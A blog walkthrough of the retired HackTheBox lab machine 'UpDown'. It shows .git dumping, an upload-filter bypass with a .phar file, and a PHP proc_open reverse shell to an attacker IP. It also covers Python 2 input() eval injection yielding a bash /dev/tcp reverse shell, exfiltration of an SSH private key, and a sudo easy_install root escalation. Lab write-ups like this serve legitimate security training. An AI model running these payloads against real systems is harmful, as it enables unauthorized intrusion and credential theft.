---
layout: post
title: "HTB: UpDown"
box: updown
img: /img/updown/updown
author: Andrew Cherney
date: 2024-03-30 19:38:12
tags: htb medium-box linux webapp git upload-bypass command-injection python
icon: "assets/icons/updown.png"
post_description: "This box starts by finding a .git directory, then using the files and commits to determine the functionality of a subdomain. After finding that subdomain and upload bypass and proc_open shell is acquired. A binary is used to laterally move to developer and lastly GTFObins can be leveraged for root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -p- 10.10.11.177 -Pn

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


sudo nmap -p22,80 -sC -sV 10.10.11.177

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 - siteisup.htb

![front page]({{ page.img }}_front_page.png)

Alright so first things first I'll test the default functionality, and I'll check localhost and the domain we find at the bottom of this page, and finally I'll check if it pings my hosted server. i will be doing this in decimal format for curiosity if it accepts that input.

![hacking attempt against site check]({{ page.img }}_hacking_attempt.png)

![siteisup check]({{ page.img }}_siteisup_check.png)

![debug my IP test]({{ page.img }}_debug_myIP.png)

```bash
httpserver

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.177 - - [30/Mar/2024 16:25:09] "GET / HTTP/1.1" 200 -
```

Functions roughly as expected with some whitelist or blacklist filtering. I'll scan for directories and see what comes up.

```bash
dirsearch -u http://siteisup.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Retired/UpDown/reports/http_siteisup.htb/_24-03-30_16-40-59.txt

Target: http://siteisup.htb/

[16:40:59] Starting: 
[16:41:34] 301 -  310B  - /dev  ->  http://siteisup.htb/dev/
[16:41:34] 200 -    0B  - /dev/
```

Hmm, a dev directory. For now I'll dive into that but it does make me think there could be a dev subdomain lying around here.

```bash
dirsearch -u http://siteisup.htb/dev/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Retired/UpDown/reports/http_siteisup.htb/_dev__24-03-30_16-42-31.txt

Target: http://siteisup.htb/

[16:42:31] Starting: dev/
[16:42:34] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/
[16:42:34] 200 -  602B  - /dev/.git/
[16:42:34] 200 -  412B  - /dev/.git/branches/
[16:42:34] 200 -   21B  - /dev/.git/HEAD
[16:42:34] 200 -  674B  - /dev/.git/hooks/
[16:42:34] 200 -  458B  - /dev/.git/info/
[16:42:34] 200 -  521B  - /dev/.git/index
[16:42:34] 200 -  298B  - /dev/.git/config
[16:42:34] 200 -  483B  - /dev/.git/logs/
[16:42:34] 200 -   73B  - /dev/.git/description
[16:42:34] 301 -  331B  - /dev/.git/logs/refs/heads  ->  http://siteisup.htb/dev/.git/logs/refs/heads/
[16:42:34] 301 -  340B  - /dev/.git/logs/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/origin/
[16:42:35] 200 -  179B  - /dev/.git/logs/refs/remotes/origin/HEAD
[16:42:34] 200 -  179B  - /dev/.git/logs/HEAD
[16:42:35] 200 -  465B  - /dev/.git/objects/
[16:42:35] 200 -  112B  - /dev/.git/packed-refs
[16:42:34] 301 -  325B  - /dev/.git/logs/refs  ->  http://siteisup.htb/dev/.git/logs/refs/
[16:42:35] 301 -  328B  - /dev/.git/refs/remotes  ->  http://siteisup.htb/dev/.git/refs/remotes/
[16:42:35] 301 -  335B  - /dev/.git/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/refs/remotes/origin/
[16:42:35] 200 -  472B  - /dev/.git/refs/
[16:42:34] 301 -  333B  - /dev/.git/logs/refs/remotes  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/
[16:42:34] 200 -  240B  - /dev/.git/info/exclude
[16:42:35] 200 -   30B  - /dev/.git/refs/remotes/origin/HEAD
[16:42:35] 301 -  325B  - /dev/.git/refs/tags  ->  http://siteisup.htb/dev/.git/refs/tags/
[16:42:35] 301 -  326B  - /dev/.git/refs/heads  ->  http://siteisup.htb/dev/.git/refs/heads/
```

Here I have a couple simple options. I can **wget** the entire **.git** directory and use git to look through logs and commits or I can use **git-dumper** to grab the files in the repo.

```bash
git-dumper http://siteisup.htb/dev/.git/ gitdump/

[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
```

```bash
ls gitdump/

admin.php  changelog.txt  checker.php  index.php  stylesheet.css
```

```php
cat gitdump/checker.php

<?php
...

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}
...
```

Looking into **checker.php** we see a POST option for the check parameter where after a file extension or protocol filter it will check all the sites in an uploaded file. This clearly isn't what we see above so we'll need to look for this endpoint.

```bash
cat .htaccess 

SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Deciphering this can take some research. The TLDR of this file is it defines the allow or deny list of a site. This one denies all and only allows from the set **Required-Header** header which would look like **Special-Dev: only4dev**. At this point I'll try to brute some dev related domains hoping this header mentioning dev and the dev git directory hint towards it.

To access this I'll set up a burp rule to add the header and try to head to some subdomains. First location is **dev.siteisup.htb**.

![burp header replace rules]({{ page.img }}_dev_burp_replace.png)

# Shell as www-data

## dev.siteisup.htb

```
GET / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev
```

![dev subdomain page]({{ page.img }}_dev_page.png)

Well that's simple. This is obviously the **checker.php** we found with git dump. If we squint at the accepted file types we'll see that phar is not in the blacklist, so we have the file we plan to upload. In addition we need to double check if the uploads directory is accessible from here.

![dev uploads]({{ page.img }}_dev_uploads.png)

Alright final step here is to create a shell and upload it. Except there is some clear issues here. The checker script will create the file and once the websites are pinged it will delete it. The location the file is placed in is an md5 time function, though that matters less to me given we can view the uploads directory itself. 

To combat the file being deleted once the sites are scanned we will add 100 **https://google.com** within a multiline comment. I retrofit the pentestmonkey shell. Now all that's left is to upload it and head to the created upload directory and get our shell.

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777


```

Okay so that didn't work ... Odd the file was uploaded properly, it stalled long enough to run, and it clearly recognized the php. At this point I opted to look into other ways of making php shells to check if system() was disallowed to be used. Below are the options I found to run commands in php.

```php
system()
exec()
shell_exec()
passthru()
proc_open()
```

## proc_open()

Now I prefer to start at the bottom since the site I read eluded to proc_open being the hardest to comprehend and customize. [https://www.sitepoint.com/proc-open-communicate-with-the-outside-world/](https://www.sitepoint.com/proc-open-communicate-with-the-outside-world/) is where I retrofitted the script from. Effectively you define a cmd and run it through proc_open and never close the process.

```php
<?php
// descriptor array
$desc = array(
    0 => array('pipe', 'r'), // 0 is STDIN for process
    1 => array('pipe', 'w'), // 1 is STDOUT for process
    2 => array('file', '/tmp/error-output.txt', 'a') // 2 is STDERR for process
);

// command to invoke markup engine
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.7/7777 0>&1'";

// spawn the process
$p = proc_open($cmd, $desc, $pipes);
/*
https://google.com
https://google.com
...
https://google.com
https://google.com
*/
?>
```

Then I uploaded this and went to **http://dev.siteisup.htb/uploads/3d8dce74fff767a2d4fb85e9411ceefc/proc_open.phar** and to my surprise I did get the shell.

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.177 51282
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev/uploads/3d8dce74fff767a2d4fb85e9411ceefc$ whoami
whoami
www-data
```

# User as developer

## command-injection

So looking around a little bit we have access to the developer home and a dev directory with the siteisup page functionality:

```bash
www-data@updown:/home/developer$ cat dev/siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

```bash
www-data@updown:/home/developer/dev$ strings siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py

```

Top script uses requests and input to search for the url given. The second seems to run that script. We'll use strace to check exactly what happens when we run the binary. 

```bash
www-data@updown:/home/developer/dev$ strace ./siteisup

execve("./siteisup", ["./siteisup"], 0x7fff7bbb8ba0 /* 16 vars */) = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
brk(NULL)                               = 0x55739df5c000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffcfdcdcb60) = -1 EINVAL (Invalid argument)
fcntl(0, F_GETFD)                       = 0
fcntl(1, F_GETFD)                       = 0
fcntl(2, F_GETFD)                       = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=28111, ...}) = 0
mmap(NULL, 28111, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f26abd98000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300A\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\30x\346\264ur\f|Q\226\236i\253-'o"..., 68, 880) = 68
fstat(3, {st_mode=S_IFREG|0755, st_size=2029592, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f26abd96000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32, 848) = 32
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\30x\346\264ur\f|Q\226\236i\253-'o"..., 68, 880) = 68
mmap(NULL, 2037344, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f26abba4000
mmap(0x7f26abbc6000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f26abbc6000
mmap(0x7f26abd3e000, 319488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19a000) = 0x7f26abd3e000
mmap(0x7f26abd8c000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f26abd8c000
mmap(0x7f26abd92000, 13920, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f26abd92000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7f26abd97540) = 0
mprotect(0x7f26abd8c000, 16384, PROT_READ) = 0
mprotect(0x55739db0e000, 4096, PROT_READ) = 0
mprotect(0x7f26abdcc000, 4096, PROT_READ) = 0
munmap(0x7f26abd98000, 28111)           = 0
getegid()                               = 33
geteuid()                               = 33
setresgid(33, 33, 33)                   = 0
setresuid(33, 33, 33)                   = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
brk(NULL)                               = 0x55739df5c000
brk(0x55739df7d000)                     = 0x55739df7d000
write(1, "Welcome to 'siteisup.htb' applic"..., 38Welcome to 'siteisup.htb' application
) = 38
write(1, "\n", 1
)                       = 1
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f26abbe7090}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f26abbe7090}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
mmap(NULL, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f26abb9b000
rt_sigprocmask(SIG_BLOCK, ~[], [CHLD], 8) = 0
clone(child_stack=0x7f26abba3ff0, flags=CLONE_VM|CLONE_VFORK|SIGCHLD) = 3067
munmap(0x7f26abb9b000, 36864)           = 0
rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
wait4(3067, Enter URL here:test
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1, in <module>
NameError: name 'test' is not defined
[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 3067
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f26abbe7090}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f26abbe7090}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3067, si_uid=33, si_status=1, si_utime=0, si_stime=0} ---
exit_group(0)                           = ?
+++ exited with 0 +++
```

I'll point out the important part below:

```bash
wait4(3067, Enter URL here:test
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1, in <module>
```

It asks for a url, passed from the python script through the binary. There is a perk here that we can abuse however: the python script is a python2 script AND uses input. For those unaware input within python2 is implemented like eval(raw_input) and since eval is vulnerable we have command injection through importing modules. I'll test with curl to see if this isn't filtered out.

```bash
wait4(3118, Enter URL here:__import__('os').system('curl http://10.10.14.7:8081/test')

httpserver

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.177 - - [30/Mar/2024 18:30:10] code 404, message File not found
10.10.11.177 - - [30/Mar/2024 18:30:10] "GET /test HTTP/1.1" 404 -
```

The final piece of this puzzle is the binary is an SUID with the owner of developer. Now I can run it without strace and send a reverse shell. 

```bash
__import__('os').system('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.7/8888 0>&1"')

nc -nvlp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.11.177 41792
developer@updown:/home/developer/dev$ cd ~
cd ~
developer@updown:/home/developer$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
developer@updown:/home/developer$ whoami
whoami
developer
```

Okay so final steps I'll see if I can't snag an ssh key/insert my own to ssh in since this limited shell has a lack of permissions I ought have. 

```bash
developer@updown:/home/developer$ ls .ssh
ls .ssh
authorized_keys
id_rsa
id_rsa.pub
developer@updown:/home/developer$ cd .ssh
cd .ssh
developer@updown:/home/developer/.ssh$ python3 -m http.server 8081
python3 -m http.server 8081
```

```bash
wget http://siteisup.htb:8081/id_rsa

--2024-03-30 18:35:28--  http://siteisup.htb:8081/id_rsa
Resolving siteisup.htb (siteisup.htb)... 10.10.11.177
Connecting to siteisup.htb (siteisup.htb)|10.10.11.177|:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2602 (2.5K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa                        100%[================================================>]   2.54K  --.-KB/s    in 0s 

chmod 600 id_rsa 

ssh developer@updown.htb -i id_rsa 
The authenticity of host 'updown.htb (10.10.11.177)' can't be established.
ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
developer@updown:~$ cat user.txt 
8f7166cb3-----------------------
```

# Root

## easy_install

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:~$ file /usr/local/bin/easy_install
/usr/local/bin/easy_install: Python script, ASCII text executable
developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
developer@updown:~$ ls -al /usr/local/bin/easy_install
-rwxr-xr-x 1 root root 229 Aug  1  2022 /usr/local/bin/easy_install
```

easy_install is a python utility, this is not a custom script. Generally don't think sudo should be used with these things as I know pip sometimes complains about it. In this case though easy_install is in GTFObins with a sudo privesc. 

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.3x2tHIdqPG
Writing /tmp/tmp.3x2tHIdqPG/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.3x2tHIdqPG/egg-dist-tmp-yBvnKe
# whoami
root
# cat /root/root.txt
acebb23fd-----------------------
```

As a little debrief easy_install will look for setup.py and unambiguously run it. If run without sudo all this would do is inherit developer's permissions. Another lesson in overly permissive sudo usage.
